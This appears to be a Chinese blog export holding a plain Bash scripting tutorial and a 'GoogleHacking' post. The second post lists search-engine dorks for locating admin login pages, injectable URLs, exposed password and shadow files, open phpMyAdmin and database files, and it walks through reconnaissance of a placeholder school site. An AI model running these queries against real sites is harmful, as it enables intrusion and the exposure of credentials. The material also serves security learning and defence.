<h4 id="本地变量"><a href="#本地变量" class="headerlink" title="本地变量"></a>本地变量</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">本地变量 在用户现在的shell生命期的脚本中使用</span><br><span class="line"> 变量名=值</span><br><span class="line"><span class="number">1</span>.等号两边不可以有空格</span><br><span class="line"><span class="number">2</span>.取值包含空格，必须用双引号括起来</span><br><span class="line"><span class="number">3</span>.Shell变量可以用大小写字母，区分大小写</span><br><span class="line"></span><br><span class="line">变量是弱类型的, 不用声明类型</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量声明及赋值格式</span></span><br><span class="line">变量=值（等号两边不能有空格）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量的引用</span></span><br><span class="line"> <span class="variable">$变</span>量名</span><br><span class="line"> <span class="variable">$&#123;</span>变量名&#125;</span><br><span class="line"> 变量名为<span class="number">1</span>个字符时建议使用方式一，多余一个字符时建议使用方式二</span><br><span class="line"> 举例: <span class="variable">$a</span> <span class="variable">$&#123;</span>abc&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除变量</span></span><br><span class="line">unset 变量名</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>name=Jack</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>echo <span class="variable">$&#123;</span>name&#125;</span><br><span class="line">user<span class="variable">@computer</span>: ~<span class="variable">$ </span>unset name  <span class="comment"># 注意,name前没有$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置只读变量</span></span><br><span class="line">设置变量时，不想再改变其值，可以将之设为只读变量</span><br><span class="line"> 变量名=值</span><br><span class="line"> readonly  变量名</span><br></pre></td></tr></table></figure>

<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>Bash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用</p>
<p>内置环境变量</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">HOME:</span> 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者</span><br><span class="line">家目录了。</span><br><span class="line"><span class="symbol">SHELL:</span> 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 <span class="meta-keyword">/bin/</span>bash</span><br><span class="line">PWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由</span><br><span class="line">Linux自动设置的</span><br><span class="line"><span class="symbol">HISTSIZE:</span> 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”</span><br><span class="line">则是由这个值来设定的。</span><br><span class="line"><span class="symbol">PATH:</span> 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由</span><br><span class="line">PATH的变量内的目录来查询，所以，目录的顺序也很重要。</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">环境变量可以在命令行中设置，但用户注销时这些值将丢失</span><br><span class="line">   环境变量均为大写</span><br><span class="line">   必须用<span class="built_in">export</span>命令导出</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line">variable-name=value</span><br><span class="line"><span class="built_in">export</span> variable-name(环境变量名大写)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示环境变量</span></span><br><span class="line">env 可以看到所有的环境变量</span><br><span class="line"><span class="built_in">echo</span> $环境变量名 （显示一个变量）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除环境变量</span></span><br><span class="line"><span class="built_in">unset</span> 环境变量名</span><br></pre></td></tr></table></figure>


<p>修改path环境变量</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。</span><br><span class="line"><span class="comment"># 命令行修改环境变量</span></span><br><span class="line">以下在用户user主目录下操作：</span><br><span class="line">mkdir shdir &amp;&amp; cd shdir</span><br><span class="line">vi hello</span><br><span class="line">chmod <span class="number">755</span> hello</span><br><span class="line">cd ～</span><br><span class="line">export PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/shdir</span><br><span class="line">在任何目录下，输入hello即可执行该文件。</span><br><span class="line">本方式下环境变量如果修改错了，<span class="keyword">exit</span>退出后重新登陆即可恢复系统默认的值。</span><br></pre></td></tr></table></figure>

<p>配置文件中修改环境变量</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">注意，修改环境变量前最好先备份一下旧的：</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">tem</span>=<span class="variable">$PATH</span></span><br><span class="line">echo <span class="variable">$tem</span> &gt;&gt;pathbake</span><br><span class="line"></span><br><span class="line">需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：</span><br><span class="line"><span class="builtin-name">find</span> / -name “*profile”</span><br><span class="line"><span class="builtin-name">find</span> / -name “<span class="number">*ba</span>shrc”</span><br><span class="line">全局配置文件/etc<span class="built_in">/profile</span></span><br><span class="line"><span class="built_in"></span>本地配置文件~/.bashrc</span><br></pre></td></tr></table></figure>


<h4 id="内部变量"><a href="#内部变量" class="headerlink" title="内部变量"></a>内部变量</h4><p>内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">部分内部变量是：</span><br><span class="line"><span class="symbol">$</span># 传送给shell程序的位置参数的数量</span><br><span class="line"><span class="symbol">$</span>? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）</span><br><span class="line"><span class="meta"><span class="meta-keyword">$0</span> shell程序的名称</span></span><br><span class="line"><span class="symbol">$</span>* 调用shell程序时所传送的全部参数的单字符串，<span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>…形式保存的参数</span><br><span class="line"><span class="symbol">$</span>@ <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>…形式保存的参数</span><br><span class="line"><span class="meta"><span class="meta-keyword">$n</span> 第n个参数</span></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span> 本程序的PID</span><br><span class="line"><span class="symbol">$</span>! 上一个命令的PID</span><br></pre></td></tr></table></figure>


<h3 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"># read 从键盘上读取变量的值</span><br><span class="line">read  [选项]  变量名列表</span><br><span class="line">    常用选项</span><br><span class="line">    -<span class="ruby">a ANAME   将输入读入ANAME的数组</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">n NCHARS  读入N个字符</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">p PROMPT  显示一个提示</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">r         取消转移</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">s         安静模式，输入的字符将不会提示</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">t TIMEOUT 超过指定时间，read自动停止</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"># echo 显示字符串或变量的值</span><br><span class="line">echo  [选项]  字符串</span><br><span class="line">    常用选项</span><br><span class="line">    -<span class="ruby">n  不在最后自动换行</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">e  启用反斜线控制字符的转换</span></span><br><span class="line"><span class="ruby"></span>    -<span class="ruby">E  不处理转义字符。此为缺省选项；</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 输入一句话，打印输入的话</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&#x27;please type some words, I will print them: &#x27;</span> words</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$words</span></span><br></pre></td></tr></table></figure>

<h3 id="条件测试"><a href="#条件测试" class="headerlink" title="条件测试"></a>条件测试</h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"># test</span><br><span class="line"><span class="keyword">test </span>条件表达式</span><br><span class="line">如果测试条件为真，test命令会返回0，否则返回一个非0的数值</span><br><span class="line"><span class="keyword">test </span>语句与if/then和case语句一起，构成shell编程的控制转移结构</span><br><span class="line"></span><br><span class="line"># []</span><br><span class="line">[ 条件表达式 ]</span><br><span class="line">方括号的内侧两边各需一个空格</span><br><span class="line"></span><br><span class="line">条件表达式的值为真返回零，为假时返回非零值</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="文件状态判断"><a href="#文件状态判断" class="headerlink" title="文件状态判断"></a>文件状态判断</h4><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">-d <span class="meta">filename</span>	若文件<span class="meta">filename</span>为目录文件，则返回真</span><br><span class="line"></span><br><span class="line">-f <span class="meta">filename</span>	文件是否存在且为普通文件，则返回真</span><br><span class="line"></span><br><span class="line">-r <span class="meta">filename</span>	若文件<span class="meta">filename</span>可读，则返回真</span><br><span class="line"></span><br><span class="line">-s <span class="meta">filename</span>	若文件<span class="meta">filename</span>的长度大于0，则返回真</span><br><span class="line"></span><br><span class="line">-w <span class="meta">filename</span>	若文件<span class="meta">filename</span>可写，则返回真</span><br><span class="line"></span><br><span class="line">-<span class="meta">x</span> <span class="meta">filename</span>	若文件<span class="meta">filename</span>可执行，则返回真</span><br><span class="line"></span><br><span class="line">-e <span class="meta">filename</span>	文件是否存在</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 输入文件的绝对路径，判断文件是否存在</span></span><br><span class="line"><span class="built_in">read</span>  -p <span class="string">&#x27;input file path: &#x27;</span> file</span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件存在&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;文件不存在&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>


<h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>  [ 条件表达式 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    命令序列1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    命令序列2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">当<span class="string">&quot;条件表达式&quot;</span>的测试值为真时，执行<span class="string">&quot;命令序列1&quot;</span>，否则，执行<span class="string">&quot;命令序列2&quot;</span>。命令序列中的命令</span><br><span class="line">可以是一个或者多个。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ 条件表达式 ]; <span class="keyword">then</span></span><br><span class="line">    命令序列</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">当<span class="string">&quot;条件表达式&quot;</span>的测试值为真时，执行<span class="string">&quot;命令序列&quot;</span>,否则，执行条件语句后面的命令。条件表达</span><br><span class="line">式与<span class="keyword">then</span>之间的分号<span class="string">&quot;;&quot;</span>起命令分隔符的作用。</span><br><span class="line"></span><br><span class="line">语法形式三</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> 条件表达式1</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    命令序列1</span><br><span class="line"><span class="keyword">elif</span> [ 条件表达式2 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    命令序列2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    命令序列3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">这是包含二层嵌套的条件语句，当<span class="string">&quot;条件表达式1&quot;</span>为真时，执行<span class="string">&quot;命令序列1&quot;</span>,否则，在<span class="string">&quot;条件表</span></span><br><span class="line"><span class="string">达式2&quot;</span>为真的情况下，执行<span class="string">&quot;命令序列2&quot;</span>，否则，执行<span class="string">&quot;命令序列3&quot;</span>,<span class="string">&quot;命令序列3&quot;</span>属于第2个条</span><br><span class="line">件语句的一部分。</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 判断输入的路径是文件还是目录</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&#x27;please input the file path: &#x27;</span> file</span><br><span class="line"><span class="keyword">if</span> [ -d <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;this is a directory&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;this is a file&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;wrong file type, or the file do not exist&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h4 id="数字操作符"><a href="#数字操作符" class="headerlink" title="数字操作符"></a>数字操作符</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">n1</span> –eq n<span class="number">2</span>判断数字n<span class="number">1</span>与n<span class="number">2</span>是否相等，若相等，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> –ne n<span class="number">2</span>判断数字n<span class="number">1</span>与n<span class="number">2</span>是否不等，若不等，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> –lt n<span class="number">2</span>判断数字n<span class="number">1</span>是否小于n<span class="number">2</span>，若是，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> –gt n<span class="number">2</span>判断数字n<span class="number">1</span>是否大于n<span class="number">2</span>，若是，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> –le n<span class="number">2</span>判断数字n<span class="number">1</span>是否小于或等于n<span class="number">2</span>，若是，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> –ge n<span class="number">2</span> 判断数字n<span class="number">1</span>是否大于或等于n<span class="number">2</span>，若是，返回<span class="number">0</span>，否则，返回<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="字符串操作符"><a href="#字符串操作符" class="headerlink" title="字符串操作符"></a>字符串操作符</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> 若字符串<span class="built_in">string</span>非空，则返回真</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-n <span class="built_in">string</span> 若字符串<span class="built_in">string</span>长度大于<span class="number">0</span>，则返回真</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-z <span class="built_in">string</span> 若字符串<span class="built_in">string</span>长度为<span class="number">0</span>，则为返回真</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>1 = <span class="built_in">string</span>2 若字符串<span class="built_in">string</span>1和<span class="built_in">string</span>2相等，则返回真</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>1 != <span class="built_in">string</span>2 若字符串<span class="built_in">string</span>1和 <span class="built_in">string</span>2不等，则返回真</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h4><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">e1</span> <span class="comment">–a</span> <span class="comment">e2	逻辑表达式e1和e2同时为真时，返回0，否则，返回1</span></span><br><span class="line"><span class="comment">e1</span> <span class="comment">–o</span> <span class="comment">e2	逻辑表达式e1和e2有一个为真时，返回0，否则，返回1</span></span><br><span class="line"><span class="comment">!</span> <span class="comment">e1	</span>    <span class="comment">若逻辑表达式e1不为真时，返回0，</span><span class="string">,</span><span class="comment">否则，返回1</span></span><br></pre></td></tr></table></figure>

<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量名 <span class="keyword">in</span> 参数列表</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    命令列表</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">将<span class="string">&quot;参数列表&quot;</span>中的元素依次赋给<span class="string">&quot;变量名&quot;</span>，在每次赋值后执行<span class="string">&quot;命令列表&quot;</span>，<span class="string">&quot;参数列表&quot;</span>表示<span class="string">&quot;变</span></span><br><span class="line"><span class="string">量名&quot;</span>的取值范围</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((初始化变量值；结束循环条件；运算))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    命令序列</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ 条件表达式 ]</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    命令列表</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">循环执行<span class="string">&quot;命令列表&quot;</span>中的命令，直至<span class="string">&quot;条件表达式&quot;</span>的值为假。</span><br><span class="line"></span><br><span class="line">Until [ 条件 ]</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    命令序列</span><br><span class="line">Done</span><br><span class="line">直到条件满足时循环结束</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc</span></span><br><span class="line">directory=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span> [ ! <span class="variable">$directory</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;please input the argument directory&quot;</span></span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">files=`ls <span class="variable">$&#123;directory&#125;</span>`</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ -f <span class="variable">$&#123;file&#125;</span> ]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    suffix=<span class="variable">$&#123;file#*\.&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$suffix</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$suffix</span> == <span class="string">&quot;txt&quot;</span> ]]</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">      prefix=<span class="variable">$&#123;file%\.*&#125;</span></span><br><span class="line">      mv <span class="variable">$directory</span>/<span class="variable">$file</span> <span class="variable">$directory</span>/<span class="variable">$prefix</span>.doc</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">functionname</span></span>() &#123;</span><br><span class="line">    命令列表</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line">函数的调用方式为：</span><br><span class="line">functionname arguments</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleHacking</title>
    <url>/post/47235/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Google hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动</p>
<p>Google hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台</p>
<span id="more"></span>

<h3 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h3><h4 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h4><p>这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入<code>intext:动漫</code>，将返回所有在网页正文部分包含”动漫”的网页，<code>allintext:</code>使用方法和<code>intext</code>类似</p>
<h4 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h4><p>和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:<code>intitle:安全天使</code>，将返回所有网页标题中包含”安全天使”的网页，同理<code>allintitle:</code>也同<code>intitle</code>类似</p>
<h4 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h4><p>搜索google里关于某些内容的缓存，也许能找到一些好东西</p>
<h4 id="define"><a href="#define" class="headerlink" title="define"></a>define</h4><p>搜索某个词语的定义，搜索:<code>define:hacker</code>，将返回关于hacker的定义</p>
<h4 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h4><p>搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:<code>filetype:doc</code>，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富</p>
<h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><p>查找指定站点的一些基本信息</p>
<h4 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h4><p>搜索:<code>inurl:www.123.net</code>可以返回所有和<code>www.123.net</code>做了链接的URL</p>
<h4 id="site"><a href="#site" class="headerlink" title="site"></a>site</h4><p>搜索:<code>site:www.123.net</code>，将返回所有和123.net这个站有关的URL</p>
<p>还有一些操作符也是很有用的:</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">– 把某个字忽略</span><br><span class="line"></span><br><span class="line">~ 同意词</span><br><span class="line"></span><br><span class="line"><span class="bullet">. </span>单一的通配符</span><br><span class="line"></span><br><span class="line">“” 精确查询</span><br></pre></td></tr></table></figure>

<h3 id="典型用法"><a href="#典型用法" class="headerlink" title="典型用法"></a>典型用法</h3><ul>
<li>找管理后台地址</li>
</ul>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">site:</span>xxx.com intext：管理后台登陆用户名密码系統账号</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">site:</span>xxx.com inurl: login<span class="meta-keyword">/admin/</span>manage<span class="meta-keyword">/manager/</span>adminlogin/system </span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">site:</span>xxx.com intitle 管理后台登陆</span><br></pre></td></tr></table></figure>

<ul>
<li>找上传类漏洞地址：</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:file</span> </span><br><span class="line"></span><br><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:upload</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>找注入页面</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:php</span>?id=</span><br></pre></td></tr></table></figure>

<ul>
<li>找编辑器页面</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">site:xxx.<span class="keyword">com</span> inur<span class="variable">l:ewebeditor</span></span><br></pre></td></tr></table></figure>

<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">intitle:</span>”index of” etc</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”Index of” .sh_history</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”Index of” .bash_history</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” passwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” people.lst</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” pwd<span class="meta">.db</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” spwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” master.passwd</span><br><span class="line"></span><br><span class="line"><span class="symbol">intitle:</span>”index of” htpasswd</span><br><span class="line"></span><br><span class="line">“<span class="meta"># -FrontPage-” inurl:service.pwd</span></span><br></pre></td></tr></table></figure>


<p>同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">intext</span>:<span class="type">ZeroBoard</span> file<span class="keyword">type</span>:php</span><br></pre></td></tr></table></figure>

<p>或者使用:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">inurl:</span>　outlogin.php?_zb_path= site:.jp</span><br></pre></td></tr></table></figure>


<p>phpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">intitle:phpmyadmin intext:<span class="keyword">Create</span> <span class="built_in">new</span> <span class="keyword">database</span></span><br></pre></td></tr></table></figure>

<p>可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">allinur<span class="variable">l:bbs</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">filetype</span>:mdb inur<span class="variable">l:database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">filetype</span>:inc conn</span><br><span class="line"></span><br><span class="line">inur<span class="variable">l:data</span> <span class="keyword">filetype</span>:mdb</span><br><span class="line"></span><br><span class="line">intitle:”<span class="built_in">index</span> of” data //在一些配置不正确的apache+win32的服务器上经常出现这种情况</span><br></pre></td></tr></table></figure>


<h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><p>利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试</p>
<p>首先用google先看这个站点的一些基本情况</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">site:</span>xxxx.com</span><br></pre></td></tr></table></figure>

<p>从返回的信息中，找到几个该校的几个系院的域名：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a1.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a2.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a3.xxxx.com</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a4.xxxx.com</span><br></pre></td></tr></table></figure>

<p>顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">site</span>:xxxx.com file<span class="keyword">type</span>:doc</span><br></pre></td></tr></table></figure>


<p>得到N个不错的doc。先找找网站的管理后台地址：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">site:xxxx.<span class="keyword">com</span> intex<span class="variable">t:</span>管理</span><br><span class="line"></span><br><span class="line">site:xxxx.<span class="keyword">com</span> inur<span class="variable">l:login</span></span><br><span class="line"></span><br><span class="line">site:xxxx.<span class="keyword">com</span> intitle:管理</span><br></pre></td></tr></table></figure>

<p>超过获得2个管理后台地址：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>a2.xxxx.com<span class="regexp">/sys/</span>admin_login.asp</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>a3.xxxx.com:<span class="number">88</span><span class="regexp">/_admin/</span>login_in.asp</span><br></pre></td></tr></table></figure>


<p>看看服务器上跑的是什么程序：</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:asp</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:php</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a2.xxxx.com file<span class="keyword">type</span>:aspx</span><br><span class="line"></span><br><span class="line"><span class="title">site</span>:a3.xxxx.com file<span class="keyword">type</span>:asp</span><br></pre></td></tr></table></figure>


<p>a2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛</p>
<p>a3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">site:a2<span class="selector-class">.xxxx</span><span class="selector-class">.com</span> intext:ftp:<span class="comment">//:</span></span><br></pre></td></tr></table></figure>

